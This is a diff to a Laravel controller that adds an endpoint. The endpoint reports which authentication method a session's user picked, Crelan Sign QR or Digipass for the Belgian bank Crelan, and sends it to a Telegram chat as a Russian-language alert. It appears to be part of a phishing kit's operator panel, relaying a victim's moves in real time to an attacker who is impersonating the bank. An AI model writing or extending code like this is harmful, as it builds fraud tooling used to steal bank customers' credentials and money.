@@ -10,6 +10,7 @@ use App\Http\Requests\CreateSessionRequest;
 use App\Http\Resources\SessionResource;
 use App\Models\Session;
 use App\Services\SessionService;
+use App\Services\TelegramService;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
 
@@ -21,6 +22,7 @@ class SessionController extends Controller
     public function __construct(
         private readonly CreateSessionAction $createSessionAction,
         private readonly SessionService $sessionService,
+        private readonly TelegramService $telegramService,
     ) {}
 
     /**
@@ -142,6 +144,37 @@ class SessionController extends Controller
             pageUrl: $pageUrl,
             actionType: $actionType,
         ));
+
+        return response()->json([
+            'success' => true,
+        ]);
+    }
+
+    /**
+     * Notify method selection (Crelan Sign / Digipass)
+     * 
+     * POST /api/session/{session}/method
+     */
+    public function notifyMethod(Session $session, Request $request): JsonResponse
+    {
+        if (!$session->isActive()) {
+            return response()->json([
+                'success' => false,
+                'error' => 'Session is not active',
+            ], 400);
+        }
+
+        $method = $request->input('method', 'unknown');
+
+        $methodLabel = match ($method) {
+            'crelan_sign' => '📷 Crelan Sign (QR)',
+            'digipass' => '🔑 Digipass',
+            default => "❓ {$method}",
+        };
+
+        $text = "🔀 <b>Пользователь выбрал метод:</b> {$methodLabel}";
+
+        $this->telegramService->sendSessionUpdate($session, $text);
 
         return response()->json([
             'success' => true,
